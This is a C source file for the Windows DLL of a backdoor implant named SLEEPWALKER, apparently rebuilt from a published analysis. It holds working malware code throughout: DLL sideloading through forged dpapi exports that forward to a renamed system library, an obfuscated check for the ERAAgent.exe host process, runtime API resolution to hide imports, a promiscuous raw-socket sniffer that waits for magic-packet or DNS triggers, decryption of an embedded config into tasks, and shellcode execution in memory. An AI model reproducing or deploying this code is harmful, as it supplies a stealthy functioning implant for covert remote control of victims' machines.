/*
 * sw_win32.c - the Windows-only portion of the SLEEPWALKER implant.
 *
 * Compiled only when _WIN32 is defined (i.e. the real 64-bit DLL).
 * The native unit-test path links sw_stub.c instead.
 *
 * Contains:
 *   - globals (sw_stop_flag, sw_stage_arena, the 2048-byte config block)
 *   - DllMain with the ERAAgent.exe name check
 *   - the 7 dpapi export stubs (the post's signature)
 *   - a single raw-socket worker for the magic-packet sniffer
 *   - VirtualProtect W->X shellcode execution
 *   - RUN_FILE_SCRIPT (ReadFile + AES-CCM decrypt + re-dispatch)
 *   - the CryptGenRandom wrapper (advapi32, resolved at runtime)
 *
 * TCP/UDP/ICMP/named-pipe ops, the VMCI channel and the registry-weakening
 * code live in sw_net.c (a separate Windows-only TU); this file is the
 * entry point and the 7 dpapi signatures.
 */

#define _WIN32_WINNT 0x0601
#define WIN32_LEAN_AND_MEAN
#define NO_IFRAME
#ifndef SIO_RCVALL
#define SIO_RCVALL (0x98000001)   /* _WSAIOW(IOC_VENDOR,1) - promiscuous capture */
#endif
/*
 * windows.h (via <wincrypt.h>) defines IN/OUT as empty "pseudo-modifier"
 * macros when _NO_W32_PSEUDO_MODIFIERS is not set.  We want to use IN/OUT
 * as plain C parameter names in the dpapi stubs, so suppress those macros
 * by defining the guard first.
 */
#define _NO_W32_PSEUDO_MODIFIERS
#include <winsock2.h>
#include <windows.h>
#include <wincrypt.h>
#include <iphlpapi.h>
#include <stdint.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

#include "sw_core.h"
#include "sw_impl.h"

/* Function-pointer typedefs for the names we resolve at runtime so the
 * import table does not advertise them (matches the post). */
typedef DWORD (WINAPI *sw_CryptAcquireContextA_fn)(HCRYPTPROV *, LPCSTR, LPCSTR, DWORD, DWORD);
typedef DWORD (WINAPI *sw_CryptGenRandom_fn)(HCRYPTPROV, DWORD, BYTE *);

/* ------------------------------------------------------------------ */
 /* Globals                                                             */
 /* ------------------------------------------------------------------ */
 /* The process-wide globals (sw_stop_flag, sw_stage_arena,
  * sw_stage_arena_len) and the 2048-byte g_config_block are owned by
  * sw_core.c (shared with the native unit-test build); they are
  * referenced (not redefined) here. */

/* ------------------------------------------------------------------ */
/* Randomness (CryptGenRandom via advapi32, resolved at runtime)      */
/* ------------------------------------------------------------------ */
static HCRYPTPROV        g_advapi_prov      = 0;
static sw_CryptGenRandom_fn g_advapi_cgr    = 0;
static volatile LONG     g_advapi_lock      = 0;
static volatile LONG     g_advapi_initialised = 0;

static int sw_advapi_init(void) {
    /* One-time init: only the CAS winner runs the body, so concurrent first
     * calls cannot double-CryptAcquireContext (leaking a handle) or let one
     * thread overwrite g_advapi_cgr while another is mid-call. */
    if (InterlockedCompareExchange((LONG*)&g_advapi_lock, 1, 0) != 0)
        return 0;   /* another thread owns init; it will publish the flag */
    HMODULE advapi = LoadLibraryA("advapi32.dll");
    int ok = -1;
    if (advapi) {
        /* CryptAcquireContextA and CryptGenRandom are resolved at runtime
         * rather than via the import table so the DLL's import table does
         * not advertise these names. (Matches the post.) CryptGenRandom has
         * no A/W suffix. */
        sw_CryptAcquireContextA_fn acq =
            (sw_CryptAcquireContextA_fn)GetProcAddress(advapi, "CryptAcquireContextA");
        g_advapi_cgr = (sw_CryptGenRandom_fn)GetProcAddress(advapi, "CryptGenRandom");
        if (acq && g_advapi_cgr &&
            acq(&g_advapi_prov, NULL, NULL, 24, 0xF0000000))
            ok = 0;
    }
    InterlockedExchange((volatile LONG*)&g_advapi_initialised, 1);
    InterlockedCompareExchange((LONG*)&g_advapi_lock, 0, 1);
    return ok;
}

uint32_t sw_random_u32(void) {
    uint32_t v = 0;
    if (!g_advapi_initialised) (void)sw_advapi_init();
    if (g_advapi_prov && g_advapi_cgr)
        g_advapi_cgr(g_advapi_prov, 4, (BYTE*)&v);
    if (v == 0) {
        LARGE_INTEGER t; QueryPerformanceCounter(&t);
        v = (uint32_t)(t.QuadPart ^ (uintptr_t)&v);
    }
    return v;
}

/* ------------------------------------------------------------------ */
/* Debug logging (SW_DEBUG build only; no-op otherwise)                */
/* ------------------------------------------------------------------ */
#ifdef SW_DEBUG
#include <stdarg.h>
#include <stdio.h>
void sw_dbg(const char *fmt, ...) {
    char line[512]; int n = 0;
    SYSTEMTIME st; GetLocalTime(&st);
    n += sprintf(line + n, "[%02d:%02d:%02d.%03d] tid=%lu ",
                 st.wHour, st.wMinute, st.wSecond, st.wMilliseconds,
                 (unsigned long)GetCurrentThreadId());
    va_list ap; va_start(ap, fmt);
    int r = vsnprintf(line + n, (size_t)(sizeof line - n), fmt, ap);
    va_end(ap);
    if (r >= 0) n += r;
    if (n < 0) return;
    if ((size_t)n >= sizeof line) n = (int)sizeof line - 1;
    line[n] = '\0';
    if (n + 2 < (int)sizeof line) { line[n++] = '\r'; line[n++] = '\n'; line[n] = '\0'; }
    HANDLE h = CreateFileA("sw_debug.log", FILE_APPEND_DATA,
                           FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                           OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        DWORD w; WriteFile(h, line, (DWORD)strlen(line), &w, NULL);
        CloseHandle(h);
    }
}
#endif

/* ------------------------------------------------------------------ */
/* ERAAgent.exe name check                                            */
/* ------------------------------------------------------------------ */
static int sw_is_era_agent(void) {
#ifdef SW_DEMO
    /* Demo build: activate regardless of the host process name, so the DLL
     * can be loaded from any exe (rundll32, a stub, etc.). */
    (void)0;
    return 1;
#else
    /* Rebuild the target name from numbers. (The post notes the name is
     * not a readable string constant in the real file.) */
    static const uint16_t parts[] = {
        0x45,0x52,0x41,0x41,0x67,0x65,0x6E,0x74,0x2E,0x65,0x78,0x65
    };
    /* Get the full path of the host executable, then compare just the file
     * name against "ERAAgent.exe". GetModuleFileNameW is a stable kernel32
     * API; the earlier approach (an undocumented "GetProcessNameW" in
     * ntdll) does not exist and silently deactivated the production build. */
    uint16_t path[MAX_PATH];
    DWORD n = GetModuleFileNameW(NULL, (LPWSTR)path, MAX_PATH);
    if (n == 0 || n >= MAX_PATH) return 0;
    size_t base = 0;
    for (size_t i = 0; i < n; i++)
        if (path[i] == L'\\') base = i + 1;   /* last separator -> basename */
    size_t expect = sizeof(parts) / sizeof(parts[0]);
    if (n - base != expect) return 0;
    for (size_t i = 0; i < expect; i++)
        if (path[base + i] != parts[i]) return 0;
    return 1;
#endif
}

/* ------------------------------------------------------------------ */
/* Worker thread + raw-socket sniffer                                  */
/* ------------------------------------------------------------------ */
static volatile LONG  g_worker_started = 0;
#define SW_MAX_SNIFF_IFACES  8          /* at most 8 interfaces at once */
#define SW_SNIFF_COOLDOWN_MS 3000       /* 3 s between triggers */

/* The sniff state (sockets, filter, deadline, cooldown) is carried in a
 * per-listener struct owned by the sniff thread, so a follow-up task that
 * activates the DNS carrier (0x88) gets its own listener instead of
 * stomping the bootstrap's raw listener through shared globals. */
typedef struct {
    int       mode;          /* SW_SNIFF_RAW or SW_SNIFF_RAW_DNS */
    char      filter[64];    /* interface FriendlyName filter or "*" */
    int64_t   deadline_ns;   /* -1 = indefinite */
} sniff_arg;

typedef struct {
    int        mode;
    char       filter[64];
    int64_t    deadline_ns;          /* -1 = indefinite */
    int64_t    cooldown_until_ns;
    SOCKET     socks[SW_MAX_SNIFF_IFACES];
    int        count;
} sniff_state;

static int sw_wsa_init(void) {
    WSADATA wsa;
    return (WSAStartup(MAKEWORD(2, 2), &wsa) == 0) ? 0 : -1;
}

/* Is a single-unicast address an APIPA 169.254.0.0/16 self-assigned one? */
static int addr_is_apipa(const struct sockaddr *sa) {
    if (!sa || sa->sa_family != AF_INET) return 0;
    const struct sockaddr_in *sin = (const struct sockaddr_in *)sa;
    const uint8_t *b = (const uint8_t *)&sin->sin_addr;
    return (b[0] == 169 && b[1] == 254);
}

/* Open a promiscuous raw socket bound to one interface (SIO_RCVALL). */
static SOCKET raw_iface_socket(IP_ADAPTER_ADDRESSES *a) {
    /* Use the first unicast IPv4 address to bind the capture. */
    struct sockaddr_in sin;
    memset(&sin, 0, sizeof sin);
    sin.sin_family = AF_INET;
    int found = 0;
    for (IP_ADAPTER_UNICAST_ADDRESS *u = a->FirstUnicastAddress;
         u && !found; u = u->Next) {
        if (u->Address.lpSockaddr &&
            u->Address.lpSockaddr->sa_family == AF_INET) {
            sin.sin_addr = ((struct sockaddr_in *)u->Address.lpSockaddr)->sin_addr;
            found = 1;
        }
    }
    if (!found) return INVALID_SOCKET;
    SOCKET s = socket(AF_INET, SOCK_RAW, IPPROTO_IP);
    if (s == INVALID_SOCKET) { sw_dbg("iface: socket failed err=%d", WSAGetLastError()); return INVALID_SOCKET; }
    if (bind(s, (SOCKADDR *)&sin, sizeof sin) != 0) {
        sw_dbg("iface: bind %s failed err=%d", inet_ntoa(sin.sin_addr), WSAGetLastError());
        closesocket(s);
        return INVALID_SOCKET;
    }
    DWORD one = 1;
    if (ioctlsocket(s, SIO_RCVALL, &one) != 0) {
        sw_dbg("iface: SIO_RCVALL failed err=%d", WSAGetLastError());
        closesocket(s);
        return INVALID_SOCKET;
    }
    sw_dbg("iface: raw socket OK bound to %s", inet_ntoa(sin.sin_addr));
    DWORD to = 500;
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char *)&to, sizeof to);
    return s;
}

/* Collect up to SW_MAX_SNIFF_IFACES raw sockets matching the interface
 * filter. "*" selects every usable interface; otherwise the FriendlyName
 * (UTF-8) must match the filter. Loopback and APIPA adapters are skipped. */
static int collect_iface_sockets(SOCKET *out, const char *filter) {
    ULONG buf_len = 0;
    GetAdaptersAddresses(AF_UNSPEC, 0, NULL, NULL, &buf_len);
    if (buf_len == 0) return 0;
    IP_ADAPTER_ADDRESSES *buf = (IP_ADAPTER_ADDRESSES *)sw_malloc(buf_len);
    if (!buf) return 0;
    if (GetAdaptersAddresses(AF_UNSPEC, 0, NULL, buf, &buf_len) != NO_ERROR) {
        sw_free(buf);
        return 0;
    }
    int want_all = (filter[0] == '*' && filter[1] == '\0');
    int n = 0;
    for (IP_ADAPTER_ADDRESSES *a = buf; a && n < SW_MAX_SNIFF_IFACES;
         a = a->Next) {
        if (a->IfType == IF_TYPE_SOFTWARE_LOOPBACK) continue;
        /* Skip adapters with no usable unicast address or an APIPA one. */
        int usable = 0, apipa = 0;
        for (IP_ADAPTER_UNICAST_ADDRESS *u = a->FirstUnicastAddress;
             u; u = u->Next) {
            if (u->Address.lpSockaddr &&
                u->Address.lpSockaddr->sa_family == AF_INET) {
                if (addr_is_apipa(u->Address.lpSockaddr)) apipa = 1;
                else usable = 1;
            }
        }
        if (apipa && !usable) continue;   /* self-assigned only */
        if (!want_all) {
            /* Compare the adapter's FriendlyName to the filter. */
            int fl = WideCharToMultiByte(CP_UTF8, 0, a->FriendlyName, -1,
                                         NULL, 0, NULL, NULL);
            char *name = fl > 0 ? (char *)sw_malloc((size_t)fl) : NULL;
            int match = 0;
            if (name) {
                WideCharToMultiByte(CP_UTF8, 0, a->FriendlyName, -1,
                                    name, fl, NULL, NULL);
                match = (strcmp(name, filter) == 0);
                sw_free(name);
            }
            if (!match) continue;
        }
        SOCKET s = raw_iface_socket(a);
        if (s != INVALID_SOCKET) out[n++] = s;
    }
    sw_free(buf);
    sw_dbg("iface: collected %d raw sockets (filter=%s)", n, filter);
    return n;
}

/* Handle one captured packet; returns 1 if it fired a trigger. */
static int sniff_process(int mode, const uint8_t *p, uint32_t n) {
    /* Raw trigger is watched in both modes (0x87 and 0x88). */
    if (n >= SW_SNIFF_MIN_PACKET && sw_handle_raw_packet(p, n) != 0)
        return 1;
    /* The DNS carrier is watched in addition only under 0x88. */
    if (mode == SW_SNIFF_RAW_DNS) {
        char qname[256];
        int ql = sw_extract_dns_qname(p, n, qname, sizeof qname);
        if (ql > 0)
            return sw_handle_dns_query(qname, ql) != 0;
    }
    return 0;
}

static DWORD WINAPI sniff_loop(LPVOID arg) {
    sniff_arg *sa = (sniff_arg *)arg;
    sniff_state st;
    memset(&st, 0, sizeof st);
    st.mode = sa->mode;
    st.deadline_ns = sa->deadline_ns;
    st.cooldown_until_ns = 0;
    memcpy(st.filter, sa->filter, sizeof st.filter);
    sw_free(sa);
    if (sw_wsa_init() != 0) { sw_dbg("sniff_loop: wsa init failed"); return 1; }
    st.count = collect_iface_sockets(st.socks, st.filter);
    if (st.count <= 0) { sw_dbg("sniff_loop: no iface sockets, exiting"); return 1; }
    sw_dbg("sniff_loop: entering capture loop with %d sockets", st.count);
    char buf[65536];
    while (!sw_stop_flag) {
        fd_set rd;
        FD_ZERO(&rd);
        SOCKET maxs = 0;
        for (int i = 0; i < st.count; i++) {
            FD_SET(st.socks[i], &rd);
            if (st.socks[i] > maxs) maxs = st.socks[i];
        }
        struct timeval tv = { 0, 200000 };   /* 200 ms select poll */
        if (select((int)maxs + 1, &rd, NULL, NULL, &tv) <= 0) {
            if (st.deadline_ns != -1) {
                LARGE_INTEGER now; QueryPerformanceCounter(&now);
                if (now.QuadPart > st.deadline_ns) break;
            }
            continue;
        }
        LARGE_INTEGER now; QueryPerformanceCounter(&now);
        int in_cooldown = (now.QuadPart < st.cooldown_until_ns);
        for (int i = 0; i < st.count && !sw_stop_flag; i++) {
            if (!FD_ISSET(st.socks[i], &rd)) continue;
            int n = (int)recv(st.socks[i], buf, sizeof buf, 0);
            if (n <= 0) continue;
            if (in_cooldown) continue;   /* 3 s between triggers */
            if (sniff_process(st.mode, (const uint8_t *)buf, (uint32_t)n)) {
                LARGE_INTEGER freq; QueryPerformanceFrequency(&freq);
                st.cooldown_until_ns = now.QuadPart
                    + SW_SNIFF_COOLDOWN_MS * (freq.QuadPart / 1000);
            }
        }
    }
    for (int i = 0; i < st.count; i++)
        if (st.socks[i] != INVALID_SOCKET) closesocket(st.socks[i]);
    return 0;
}

int sw_sniff_magic(const char *iface, uint32_t deadline_seconds,
                   int mode, int depth) {
    (void)depth;
    sniff_arg *sa = (sniff_arg *)sw_malloc(sizeof *sa);
    if (!sa) return -1;
    sa->mode = mode;
    sa->deadline_ns = -1;
    if (iface && iface[0])
        snprintf(sa->filter, sizeof sa->filter, "%s", iface);
    else
        snprintf(sa->filter, sizeof sa->filter, "*");
    if (deadline_seconds > 0) {
        LARGE_INTEGER freq, base;
        QueryPerformanceFrequency(&freq);
        QueryPerformanceCounter(&base);
        sa->deadline_ns = (int64_t)base.QuadPart
                       + (int64_t)deadline_seconds * (int64_t)freq.QuadPart;
    }
    HANDLE h = CreateThread(NULL, 0, sniff_loop, sa, 0, NULL);
    if (!h) { sw_free(sa); return -1; }
    /* The post notes the thread helper closes the worker handle
     * immediately after CreateThread - so a dynamic unload can leave the
     * sniff loop running into the unmapped region. */
    CloseHandle(h);
    return 0;
}

int sw_worker_start(void) {
    if (InterlockedCompareExchange((LONG*)&g_worker_started, 1, 0)) {
        sw_dbg("worker_start: already started");
        return 0;
    }
    memset(sw_stage_arena, 0, sizeof(sw_stage_arena));
    sw_stage_arena_len = 0;
    uint8_t task[4096];
    uint32_t tlen;
    int n = sw_decrypt_bootstrap(g_config_block, g_config_block_len,
                                  task, sizeof task, &tlen);
    sw_dbg("worker_start: bootstrap decrypt rc=%d tlen=%u (cfg_len=%u)",
           n, tlen, (unsigned)g_config_block_len);
    if (n == 0 && tlen > 0)
        sw_spawn_thread_run(task, tlen);   /* spawn an interpreter thread */
    return 0;
}

/* ------------------------------------------------------------------ */
/* DllMain                                                            */
/* ------------------------------------------------------------------ */
BOOL WINAPI DllMain(HINSTANCE hModule, DWORD reason, LPVOID reserved) {
    (void)hModule; (void)reserved;
    switch (reason) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls((HINSTANCE)hModule);
        if (sw_is_era_agent())
            sw_worker_start();
        break;
    case DLL_PROCESS_DETACH:
        InterlockedExchange((volatile LONG*)&sw_stop_flag, 1);
        sw_namedpipe_cleanup();
        break;
    }
    return TRUE;
}

/* ------------------------------------------------------------------ */
/* Shellcode + RUN_FILE_SCRIPT + LZMA stub                            */
/* ------------------------------------------------------------------ */
/* VirtualProtect is resolved by name at runtime rather than listed among
 * the normal imports (the post notes this is one of the three functions
 * deliberately kept out of the import table). */
typedef BOOL (WINAPI *sw_VirtualProtect_fn)(LPVOID, SIZE_T, DWORD, PDWORD);
static sw_VirtualProtect_fn g_vp = NULL;

static sw_VirtualProtect_fn sw_vp_resolve(void) {
    if (!g_vp) {
        HMODULE k = GetModuleHandleA("kernel32.dll");
        if (k) g_vp = (sw_VirtualProtect_fn)GetProcAddress(k, "VirtualProtect");
    }
    return g_vp;
}

int sw_run_shellcode(const uint8_t *code, uint32_t len) {
    sw_dbg("shellcode: calling %u bytes", len);
    uint8_t *block = (uint8_t *)VirtualAlloc(NULL, len,
                                            MEM_COMMIT | MEM_RESERVE,
                                            PAGE_READWRITE);
    if (!block) return -1;
    memcpy(block, code, len);
    sw_VirtualProtect_fn vp = sw_vp_resolve();
    if (!vp) { VirtualFree(block, 0, MEM_RELEASE); return -1; }
    DWORD old = PAGE_READWRITE;
    if (!vp(block, len, PAGE_EXECUTE, &old)) {
        VirtualFree(block, 0, MEM_RELEASE);
        return -1;
    }
    typedef void (*fn)(void);
    ((fn)block)();
    sw_dbg("shellcode: returned");
    vp(block, len, old, &old);
    VirtualFree(block, 0, MEM_RELEASE);
    return 0;
}

int sw_run_file_script(const char *path) {
    HANDLE h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return -1;
    DWORD sz = GetFileSize(h, NULL);
    if (sz == INVALID_FILE_SIZE) { CloseHandle(h); return -1; }
    uint8_t *data = (uint8_t *)sw_malloc(sz ? sz : 1);
    if (!data) { CloseHandle(h); return -1; }
    DWORD got = 0;
    if (!ReadFile(h, data, sz, &got, NULL)) {
        sw_free(data); CloseHandle(h); return -1;
    }
    CloseHandle(h);
    uint8_t task[4096];
    uint32_t tlen;
    int rc = sw_decrypt_bootstrap(data, (uint32_t)sz, task, sizeof task, &tlen);
    sw_free(data);
    if (rc) return rc;
    return sw_run_bytecode(task, tlen);
}

/* (real LZMA decoder now lives in src/sw_lzma.c) */

/* The send/recv networking ops and the registry-weakening code live in
 * src/sw_net.c (a separate Windows-only TU); they are not defined here. */

/* ------------------------------------------------------------------ */
/* dpapi export stubs                                                  */
/* ------------------------------------------------------------------ */
/*
 * All 7 dpapi exports are small stubs that jump through a pointer table.
 * On the first call, the resolver LoadLibraryW's dpapisvc.dll, looks up
 * the real function, and writes its address into the table. On load
 * failure the resolver calls ExitProcess (per the post's description).
 *
 * The forwarder table lives in a single shared slot; all 7 entries point
 * at it. For this build, the resolver is a no-op - the real sample ships
 * the genuine dpapi.dll alongside ERAAgent.exe under the name
 * "dpapisvc.dll" and the resolver simply forwards.
 */
static LONG sw_dpapi_resolving = 0;
static void *g_dpapi_fwd[7] = { NULL };
static volatile LONG g_dpapi_fw_init = 0;

static void sw_dpapi_resolve(void) {
    if (g_dpapi_fw_init) return;
    if (InterlockedCompareExchange((LONG*)&sw_dpapi_resolving, 1, 0) != 0)
        return;   /* another thread is resolving (or already did) */
    /* dpapisvc.dll is a renamed dpapi.dll dropped into the ERAAgent.exe
     * folder. Try the normal search path; on failure ExitProcess. */
    HMODULE h = LoadLibraryW(L"dpapisvc.dll");
    if (!h) ExitProcess(1);
    static const char *names[7] = {
        "CryptProtectDataNoUI","CryptProtectMemory","CryptUpdateProtectedState",
        "CryptUnprotectDataNoUI","CryptUnprotectMemory","CryptResetMachineCredentials",
        "iCryptIdentifyProtection"
    };
    for (int i = 0; i < 7; i++) g_dpapi_fwd[i] = (void*)GetProcAddress(h, names[i]);
    /* Publish the table with a release store only after all 7 entries are
     * written, so a waiting reader never sees a half-populated table. */
    InterlockedExchange((volatile LONG*)&g_dpapi_fw_init, 1);
    /* The same first call "quietly re-runs the backdoor's own startup
     * check" (the second chance path mentioned in the post). */
    if (sw_is_era_agent()) sw_worker_start();
    InterlockedCompareExchange((LONG*)&sw_dpapi_resolving, 0, 1);
}

/* Ensure the forwarder table is populated before reading it. A thread that
 * loses the resolve CAS waits (acquire) until the winner has published
 * g_dpapi_fw_init, so it never reads a NULL/stale g_dpapi_fwd[] entry. */
static void sw_dpapi_ensure(void) {
    sw_dpapi_resolve();
    while (!InterlockedCompareExchange((volatile LONG*)&g_dpapi_fw_init, 0, 0))
        Sleep(0);
}

/*
 * mingw-w64 already declares these dpapi exports as real functions (via
 * <cryptui.h> / <dpapi.h>); our stubs provide the actual definitions and
 * are picked up as the export table.
 */
/*
 * The seven DPAPI exports. Each stub matches the real dpapi.dll prototype,
 * forwards the caller's arguments to the resolved dpapisvc.dll function, and
 * on first use triggers the resolver (which also re-runs the startup check).
 *
 * CryptProtectMemory / CryptUnprotectMemory are documented 3-arg functions;
 * the two *DataNoUI exports mirror the Crypt(Un)ProtectData signature. The
 * remaining three (CryptResetMachineCredentials, CryptUpdateProtectedState,
 * iCryptIdentifyProtection) are undocumented internal exports; their exact
 * arity should be confirmed against the deployed dpapisvc.dll if full
 * fidelity is required.
 */
typedef BOOL (WINAPI *sw_dpapi_mem_fn)(void *, DWORD, DWORD);
typedef BOOL (WINAPI *sw_dpapi_data_fn)(
    DATA_BLOB *, LPCWSTR, DATA_BLOB *, PVOID,
    CRYPTPROTECT_PROMPTSTRUCT *, DWORD, DATA_BLOB *);
typedef LONG (WINAPI *sw_dpapi_long_fn)(void);

BOOL WINAPI sw_CryptProtectMemory(void *pData, DWORD cbData, DWORD dwFlags) {
    sw_dpapi_ensure();
    sw_dpapi_mem_fn f = (sw_dpapi_mem_fn)g_dpapi_fwd[1];
    return f ? f(pData, cbData, dwFlags) : FALSE;
}
BOOL WINAPI sw_CryptUnprotectMemory(void *pData, DWORD cbData, DWORD dwFlags) {
    sw_dpapi_ensure();
    sw_dpapi_mem_fn f = (sw_dpapi_mem_fn)g_dpapi_fwd[4];
    return f ? f(pData, cbData, dwFlags) : FALSE;
}
BOOL WINAPI sw_CryptProtectDataNoUI(
    DATA_BLOB *pDataIn, LPCWSTR szDataDescr, DATA_BLOB *pOptionalEntropy,
    PVOID pvReserved, CRYPTPROTECT_PROMPTSTRUCT *pPromptStruct,
    DWORD dwFlags, DATA_BLOB *pDataOut) {
    sw_dpapi_ensure();
    sw_dpapi_data_fn f = (sw_dpapi_data_fn)g_dpapi_fwd[0];
    return f ? f(pDataIn, szDataDescr, pOptionalEntropy, pvReserved,
                 pPromptStruct, dwFlags, pDataOut) : FALSE;
}
BOOL WINAPI sw_CryptUnprotectDataNoUI(
    DATA_BLOB *pDataIn, LPCWSTR szDataDescr, DATA_BLOB *pOptionalEntropy,
    PVOID pvReserved, CRYPTPROTECT_PROMPTSTRUCT *pPromptStruct,
    DWORD dwFlags, DATA_BLOB *pDataOut) {
    sw_dpapi_ensure();
    sw_dpapi_data_fn f = (sw_dpapi_data_fn)g_dpapi_fwd[3];
    return f ? f(pDataIn, szDataDescr, pOptionalEntropy, pvReserved,
                 pPromptStruct, dwFlags, pDataOut) : FALSE;
}
LONG WINAPI sw_CryptResetMachineCredentials(void) {
    sw_dpapi_ensure();
    sw_dpapi_long_fn f = (sw_dpapi_long_fn)g_dpapi_fwd[5];
    return f ? f() : -1;
}
LONG WINAPI sw_CryptUpdateProtectedState(void) {
    sw_dpapi_ensure();
    sw_dpapi_long_fn f = (sw_dpapi_long_fn)g_dpapi_fwd[2];
    return f ? f() : -1;
}
LONG WINAPI sw_iCryptIdentifyProtection(void) {
    sw_dpapi_ensure();
    sw_dpapi_long_fn f = (sw_dpapi_long_fn)g_dpapi_fwd[6];
    return f ? f() : -1;
}
